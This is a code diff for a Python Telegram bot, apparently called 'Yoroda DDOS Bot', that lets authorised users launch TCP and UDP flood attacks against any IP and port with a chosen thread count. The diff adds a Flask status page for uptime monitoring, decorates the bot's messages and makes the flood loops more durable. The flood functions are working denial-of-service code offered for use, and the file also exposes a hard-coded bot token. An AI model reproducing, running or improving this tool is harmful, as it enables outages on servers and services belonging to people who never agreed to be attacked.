@@ -5,6 +5,69 @@ import threading
 import time
 import sys
 import telebot
+from flask import Flask, jsonify
+import warnings
+
+# ============================================================
+# FLASK WEB SERVER FOR UPTIME ROBOT
+# ============================================================
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
+def home():
+    return """
+    <html>
+        <head>
+            <title>Yoroda DDOS Bot</title>
+            <style>
+                body { font-family: Arial; text-align: center; padding: 50px; background: #0a0a0a; color: #ff4444; }
+                h1 { color: #ff4444; text-shadow: 0 0 10px #ff4444; }
+                .status { font-size: 24px; margin: 20px 0; }
+                .green { color: #00ff00; }
+                .info { color: #ffffff; font-size: 16px; }
+                .container { background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #ff4444; max-width: 600px; margin: 0 auto; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>🔥 YORODA DDOS BOT</h1>
+                <div class="status green">✅ Bot is RUNNING</div>
+                <div class="info">⚡ Mode: DDOS (SA-MP)</div>
+                <div class="info">👤 Operator: Yoroda Hamada</div>
+                <div class="info" style="margin-top:20px;font-size:14px;color:#888;">
+                    Uptime Robot Monitor Active
+                </div>
+            </div>
+        </body>
+    </html>
+    """
+
+@flask_app.route('/health')
+def health():
+    return jsonify({
+        "status": "ok",
+        "bot": "running",
+        "mode": "DDOS",
+        "timestamp": time.time()
+    })
+
+@flask_app.route('/status')
+def status():
+    active_attacks = sum(1 for v in attack_running.values() if v)
+    return jsonify({
+        "status": "running",
+        "active_attacks": active_attacks,
+        "total_threads": threading.active_count()
+    })
+
+def run_web_server():
+    """Run Flask web server for Uptime Robot"""
+    port = int(os.environ.get('PORT', 10000))
+    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+
+# ============================================================
+# TELEGRAM BOT
+# ============================================================
 
 # PALITAN ITO NG BAGONG TOKEN MO
 BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"
@@ -28,7 +91,7 @@ def send_welcome(message):
         bot.reply_to(message, "You are not authorized.")
         return
     
-    welcome_text = """YORODA HAMADA
+    welcome_text = """🔥 YORODA HAMADA 🔥
 
 Security / Network Tool
 Mode: DDOS (SA-MP)
@@ -47,14 +110,14 @@ def send_help(message):
         bot.reply_to(message, "You are not authorized.")
         return
     
-    help_text = """How to use:
+    help_text = """📖 How to use:
 1. /attack
 2. Enter IP
 3. Enter port
 4. Choose tcp/udp/both
 5. Enter thread count
 
-Commands:
+⚡ Commands:
 /attack - New attack
 /stop - Stop attack
 /status - Check status"""
@@ -69,13 +132,13 @@ def start_attack(message):
     user_id = message.from_user.id
     
     if user_id in attack_running and attack_running[user_id]:
-        bot.reply_to(message, "Attack already running! Use /stop")
+        bot.reply_to(message, "⚠️ Attack already running! Use /stop")
         return
     
     user_data[user_id] = {}
     user_data[user_id]['step'] = 'ip'
     
-    bot.reply_to(message, "Enter target IP/Host:")
+    bot.reply_to(message, "🎯 Enter target IP/Host:")
 
 @bot.message_handler(func=lambda message: True)
 def handle_messages(message):
@@ -93,46 +156,48 @@ def handle_messages(message):
     if step == 'ip':
         user_data[user_id]['ip'] = message.text.strip()
         user_data[user_id]['step'] = 'port'
-        bot.reply_to(message, f"IP: {user_data[user_id]['ip']}\nEnter port:")
+        bot.reply_to(message, f"✅ IP: {user_data[user_id]['ip']}\n📡 Enter port:")
     
     elif step == 'port':
         try:
             port = int(message.text.strip())
             user_data[user_id]['port'] = port
             user_data[user_id]['step'] = 'attack_type'
-            bot.reply_to(message, f"Port: {port}\nChoose attack type:\ntcp / udp / both")
+            bot.reply_to(message, f"✅ Port: {port}\n⚡ Choose attack type:\ntcp / udp / both")
         except ValueError:
-            bot.reply_to(message, "Invalid port. Enter number:")
+            bot.reply_to(message, "❌ Invalid port. Enter number:")
     
     elif step == 'attack_type':
         attack_type = message.text.strip().lower()
         if attack_type in ['tcp', 'udp', 'both']:
             user_data[user_id]['attack_type'] = attack_type
             user_data[user_id]['step'] = 'threads'
-            bot.reply_to(message, f"Attack: {attack_type.upper()}\nEnter thread count (100-5000):")
+            bot.reply_to(message, f"✅ Attack: {attack_type.upper()}\n🧵 Enter thread count (100-5000):")
         else:
-            bot.reply_to(message, "Invalid. Choose tcp/udp/both:")
+            bot.reply_to(message, "❌ Invalid. Choose tcp/udp/both:")
     
     elif step == 'threads':
         try:
             threads = int(message.text.strip())
             if threads < 1:
-                bot.reply_to(message, "Must be > 0")
+                bot.reply_to(message, "❌ Must be > 0")
                 return
             user_data[user_id]['threads'] = threads
             user_data[user_id]['step'] = 'confirm'
             
-            summary = f"""CONFIGURATION
-IP: {user_data[user_id]['ip']}
-Port: {user_data[user_id]['port']}
-Type: {user_data[user_id]['attack_type'].upper()}
-Threads: {threads}
+            summary = f"""📋 CONFIGURATION
+━━━━━━━━━━━━━━━━
+🎯 IP: {user_data[user_id]['ip']}
+📡 Port: {user_data[user_id]['port']}
+⚡ Type: {user_data[user_id]['attack_type'].upper()}
+🧵 Threads: {threads}
+━━━━━━━━━━━━━━━━
 
-Start attack? (y/n)"""
+🚀 Start attack? (y/n)"""
             bot.reply_to(message, summary)
             
         except ValueError:
-            bot.reply_to(message, "Invalid number:")
+            bot.reply_to(message, "❌ Invalid number:")
     
     elif step == 'confirm':
         if message.text.strip().lower() == 'y':
@@ -143,16 +208,18 @@ Start attack? (y/n)"""
             
             attack_running[user_id] = True
             
-            bot.reply_to(message, f"""ATTACK STARTED!
-Target: {ip}:{port}
-Type: {attack_type.upper()}
-Threads: {threads}
-Status: RUNNING""")
+            bot.reply_to(message, f"""🔥 ATTACK STARTED!
+━━━━━━━━━━━━━━━━
+🎯 Target: {ip}:{port}
+⚡ Type: {attack_type.upper()}
+🧵 Threads: {threads}
+📊 Status: RUNNING
+━━━━━━━━━━━━━━━━""")
             
             start_attack_threads(user_id, ip, port, attack_type, threads)
             
         else:
-            bot.reply_to(message, "Cancelled.")
+            bot.reply_to(message, "❌ Cancelled.")
             del user_data[user_id]
 
 def start_attack_threads(user_id, ip, port, attack_type, threads):
@@ -166,18 +233,29 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
                     s.sendto(data, addr)
             except:
                 pass
+            finally:
+                try:
+                    s.close()
+                except:
+                    pass
     
     def tcp_attack():
         data = random._urandom(871)
         while attack_running.get(user_id, False):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
                 s.connect((ip, port))
                 while attack_running.get(user_id, False):
                     s.send(data)
                 s.close()
             except:
                 pass
+            finally:
+                try:
+                    s.close()
+                except:
+                    pass
     
     attack_threads[user_id] = []
     
@@ -224,9 +302,9 @@ def stop_attack(message):
     if user_id in attack_running and attack_running[user_id]:
         attack_running[user_id] = False
         attack_threads[user_id] = []
-        bot.reply_to(message, "ATTACK STOPPED!")
+        bot.reply_to(message, "🛑 ATTACK STOPPED!")
     else:
-        bot.reply_to(message, "No active attack.")
+        bot.reply_to(message, "❌ No active attack.")
 
 @bot.message_handler(commands=['status'])
 def check_status(message):
@@ -237,17 +315,35 @@ def check_status(message):
     user_id = message.from_user.id
     is_running = attack_running.get(user_id, False)
     
-    status_text = f"""STATUS
-Bot: Online
-Attack: {'RUNNING' if is_running else 'STOPPED'}
-Threads: {threading.active_count()} active"""
+    status_text = f"""📊 STATUS
+━━━━━━━━━━━━━━━━
+🤖 Bot: Online
+🔥 Attack: {'RUNNING' if is_running else 'STOPPED'}
+🧵 Threads: {threading.active_count()} active
+━━━━━━━━━━━━━━━━"""
     bot.reply_to(message, status_text)
 
 if __name__ == "__main__":
-    print("Yoroda Hamada's Telegram Bot is starting...")
-    print("Bot is running. Press Ctrl+C to stop.")
-    print("Unlimited attack mode enabled!")
-    print("Attack types: TCP, UDP, or BOTH")
+    print("""
+    =================================
+      YORODA DDOS BOT
+    =================================
+      Mode: DDOS (SA-MP)
+      Status: RUNNING
+      Operator: Yoroda Hamada
+    =================================
+    """)
+    
+    # Start Flask web server for Uptime Robot
+    web_thread = threading.Thread(target=run_web_server, daemon=True)
+    web_thread.start()
+    print("✅ Web server started for Uptime Robot monitoring")
+    print("🌐 Web server running on port " + os.environ.get('PORT', '10000'))
+    
+    print("🤖 Bot is running. Press Ctrl+C to stop.")
+    print("⚡ Unlimited attack mode enabled!")
+    print("⚡ Attack types: TCP, UDP, or BOTH")
+    
     try:
         bot.polling(none_stop=True, timeout=60)
     except Exception as e:
